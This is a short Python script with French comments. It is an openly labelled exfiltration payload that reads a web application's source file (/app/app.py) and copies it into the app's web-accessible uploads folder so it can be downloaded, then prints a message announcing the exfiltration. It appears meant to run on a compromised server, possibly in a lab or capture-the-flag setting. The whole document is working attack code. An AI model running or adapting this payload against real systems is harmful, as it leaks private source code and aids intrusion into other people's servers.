import os

# Lire le code source de l'application
try:
    with open('/app/app.py', 'r') as f:
        code = f.read()
    
    # Sauvegarder dans uploads (accessible via le web)
    with open('/app/uploads/exfiltrated_source.txt', 'w') as f:
        f.write("=== CODE SOURCE EXFILTRÉ ===\n\n")
        f.write(code)
    
    print("✅ Code source exfiltré dans uploads/exfiltrated_source.txt")
except Exception as e:
    print(f"❌ Erreur: {e}")
